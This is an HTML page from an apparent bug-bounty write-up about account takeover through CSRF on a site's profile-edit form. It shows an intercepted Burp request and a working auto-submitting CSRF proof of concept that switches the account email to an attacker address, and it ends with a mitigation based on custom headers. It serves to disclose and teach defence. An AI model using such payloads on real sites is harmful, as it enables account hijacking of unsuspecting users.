<!DOCTYPE html>
<html lang="en-US">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Bug Report</title>
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="crossorigin" />
    <link rel="preload" as="style"
        href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap" />
    <link rel="stylesheet"
        href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap" media="print"
        onload="this.media='all'" />
    <noscript>
        <link rel="stylesheet"
            href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap" />
    </noscript>
    <link href="../css/font-awesome/css/all.min.css?ver=1.2.0" rel="stylesheet">
    <link href="../css/bootstrap-icons/bootstrap-icons.css?ver=1.2.0" rel="stylesheet">
    <link href="../css/bootstrap.min.css?ver=1.2.0" rel="stylesheet">
    <link href="../css/aos.css?ver=1.2.0" rel="stylesheet">
    <link href="../css/main.css?ver=1.2.0" rel="stylesheet">
    <link href="../css/code-con.css" rel="stylesheet">
    <noscript>
        <style type="text/css">
            [data-aos] {
                opacity: 1 !important;
                transform: translate(0) scale(1) !important;
            }
        </style>
    </noscript>
    
</head>

<body id="top">
    <header class="bg-light">
        <nav class="navbar navbar-expand-lg navbar-light bg-light" id="header-nav" role="navigation">
            <div class="container"><a class="link-dark navbar-brand site-title mb-0" href="#">Bug Reports</a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                    data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
                    aria-expanded="false" aria-label="Toggle navigation"><span
                        class="navbar-toggler-icon"></span></button>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav ms-auto me-2">
                        <li class="nav-item"><a class="nav-link" href="../#about">About</a></li>
                        <li class="nav-item"><a class="nav-link" href="../bugbounty.html#">Bug Hunting</a></li>
                        <li class="nav-item"><a class="nav-link" href="../blogs.html">Blogs</a></li>
                        <li class="nav-item"><a class="nav-link" href="../web3.html">Web3</a></li> 
                    </ul>
                </div>
            </div>
        </nav>
    </header>
    <div class="page-content">
        <div id="content">
            <header>

            </header>






            <div class="section px-3 px-lg-4 pt-5" id="webbug">
                <div class="container-narrow">
                    <div class="text-center mb-5">
                        <h2 class="marker marker-center">CSRF</h2>
                    </div>
                    <div class="row">
                        <div>
                            <div class="card mb-3" data-aos="fade-right" data-aos-delay="100">
                                <div class="card-header px-3 py-2">
                                    <div class="d-flex justify-content-center">
                                        <div>
                                            <h3 class="h5  mb-1">Account Takeover via csrf &nbsp;</h3>
                                            <small>Date: 07/10/2023</small>
                                        </div><img src="../images/services/webpage.svg" width="48" height="45"
                                            alt="ui-ux" />
                                    </div>
                                </div>
                                <div class="card-body px-3 py-2">
                                    <p>
                                        In the domain example.com, There was a website that had a form (Edit profile). The form took inputs such as first name, last name, email address, job title, etc and it wuld update the user details.
                                        </p>
                                        <img src="bug-images/csrf-ato.png" width="600" height="600">

                                   <br> <p> <br>I filled out the form and intercepted the request using Burp Suite.</p>
                                    <div class="code-container" id="code1">
                                        <div class="code-header">
                                            <span>Burp Request</span>
                                            <button class="copy-button" onclick="copyCode('code1')">Copy</button>
                                        </div>
                                        <div class="code-content">
                                            <pre>
    <code>
POST /members/my?doaction=edit HTTP/2
Host: www.example.com
Cookie: Cookie data.....
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------422900526118549021632862276043
Content-Length: 1165
Origin: https://www.example.com
Referer: https://www.example.com/members/my?doaction=edit
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

-----------------------------422900526118549021632862276043
Content-Disposition: form-data; name="formID"

doProfile
-----------------------------422900526118549021632862276043
Content-Disposition: form-data; name="Title"

Mr
-----------------------------422900526118549021632862276043
Content-Disposition: form-data; name="FirstName"

Test
-----------------------------422900526118549021632862276043
Content-Disposition: form-data; name="LastName"

Users
-----------------------------422900526118549021632862276043
Content-Disposition: form-data; name="Age_2_1_2024"


-----------------------------422900526118549021632862276043
Content-Disposition: form-data; name="JobTitle"

Test Job
-----------------------------422900526118549021632862276043
Content-Disposition: form-data; name="Company"

Test Company
-----------------------------422900526118549021632862276043
Content-Disposition: form-data; name="Email"

luapap@penelopegemini.co.uk
-----------------------------422900526118549021632862276043
Content-Disposition: form-data; name="TechnologyInterests"

5G
-----------------------------422900526118549021632862276043--

    </code>
                </pre>

                                        </div>
                                    </div>
                                    <p>
                                        Now that I have crafted a CSRF Proof of Concept (PoC), the PoC simply comprises the necessary form fields. The request will be submitted automatically. This step highlights the successful creation of a potentially harmful PoC, underscoring the importance of addressing this vulnerability promptly.
                                        <p>

                                            <div class="code-container" id="code2">
                                                <div class="code-header">
                                                    <span>Burp Request</span>
                                                    <button class="copy-button" onclick="copyCode('code2')">Copy</button>
                                                </div>
                                                <div class="code-content">
                                                    <pre>
            <code>
&lt;form action="https://www.example.com/members/my?doaction=edit" method="POST" enctype="multipart/form-data"&gt;
    &lt;input type="hidden" name="formID" value="aoProfile" /&gt;
    &lt;input type="hidden" name="Title" value="Mr" /&gt;
    &lt;input type="hidden" name="FirstName" value="Hacked" /&gt;
    &lt;input type="hidden" name="LastName" value="Users" /&gt;
    &lt;input type="hidden" name="Age&#95;2&#95;1&#95;2024" value="" /&gt;
    &lt;input type="hidden" name="JobTitle" value="Hacked&#32;Job" /&gt;
    &lt;input type="hidden" name="Company" value="Hacked&#32;Company" /&gt;
    &lt;input type="hidden" name="Email" value="hacker&#64;ywy&#46;info" /&gt;
    &lt;input type="hidden" name="TechnologyInterests" value="5G" /&gt;
&lt;/form&gt;
              
&lt;script&gt;
    document.forms[0].submit();
&lt;/script&gt;
                     
            </code>
                        </pre>
        
                                                </div>
                                            </div>
                                      

                                    <br>
                                    <img src="bug-images/csrf-ato2.png" width="600" height="700">  
                                    <br><br>
                                    <p>
                                        Adding a custom HTTP header with an unpredictable value is indeed a simple and effective method to mitigate Cross-Site Request Forgery (CSRF) attacks. This technique leverages the Same-Origin Policy, as browsers, by default, do not allow cross-origin requests to include custom headers.</p><br>
                                        <p>
                                        By including a custom header that is dynamically generated for each user session and cannot be easily predicted by an attacker, websites can ensure that legitimate requests from their own pages will include the custom header, while malicious requests triggered by CSRF attacks from other domains will lack this crucial information.
                                    </p>
                                   
                                </div>
                            </div>
                        </div>






                    </div>
                </div>
            </div>


        </div>
    </div>
    <div id="scrolltop"><a class="btn btn-secondary" href="#top"><span class="icon"><i
                    class="fas fa-angle-up fa-x"></i></span></a></div>
    <script src="../scripts/imagesloaded.pkgd.min.js?ver=1.2.0"></script>
    <script src="../scripts/masonry.pkgd.min.js?ver=1.2.0"></script>
    <script src="../scripts/BigPicture.min.js?ver=1.2.0"></script>
    <script src="../scripts/purecounter.min.js?ver=1.2.0"></script>
    <script src="../scripts/bootstrap.bundle.min.js?ver=1.2.0"></script>
    <script src="../scripts/aos.min.js?ver=1.2.0"></script>
    <script src="../scripts/main.js?ver=1.2.0"></script>
    <script>
        function copyCode(codeId) {
            var codeContainer = document.getElementById(codeId).querySelector('.code-content');
            var range = document.createRange();
            range.selectNode(codeContainer);
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            document.execCommand('copy');
            window.getSelection().removeAllRanges();

            var copyButton = document.querySelector('.copy-button');
            copyButton.classList.add('copied');

            setTimeout(function () {
                copyButton.classList.remove('copied');
            }, 500);
        }
    </script>
</body>

</html>